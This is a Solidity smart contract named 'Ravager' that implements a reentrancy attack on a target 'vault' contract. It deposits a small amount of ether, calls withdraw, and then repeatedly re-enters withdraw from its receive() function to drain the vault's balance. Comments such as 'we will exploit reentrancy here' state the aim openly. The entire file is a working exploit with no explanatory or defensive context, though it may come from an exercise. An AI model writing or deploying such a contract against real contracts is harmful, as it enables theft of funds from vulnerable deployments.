// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

contract Ravager {
    address public owner;
    address public vault;

    constructor(address vault_) payable {
        owner = msg.sender;
        vault = vault_;
    }

    function min(uint256 a, uint256 b) private pure returns(uint256) {
        return a > b ? b : a;
    }

    function attack() public payable {
        require(msg.value >= 0.001 ether, "Not enough gas"); // not sure if we need this, remove?
        // deposit first
        (bool success,) = vault.call{value: 0.001 ether}(
            abi.encodeWithSignature("deposit(address)", address(this))
        );
        require(success, "Not successfull deposit");

        (success,) = vault.call(
            abi.encodeWithSignature("withdraw(uint256)", 0.001 ether)
        );
        require(success, "Not successfull exploit");
    }

    receive() external payable {
        // we will exploit reentrancy here
        uint256 myBalance = msg.value;
        if (msg.sender.balance > 0) {
            uint256 nextWithdraw = min(myBalance, msg.sender.balance);
            (bool success,) = vault.call(
                abi.encodeWithSignature("withdraw(uint256)", nextWithdraw)
            );
            require(success, "Not successfull reentrancy exploit");
        }
    }
}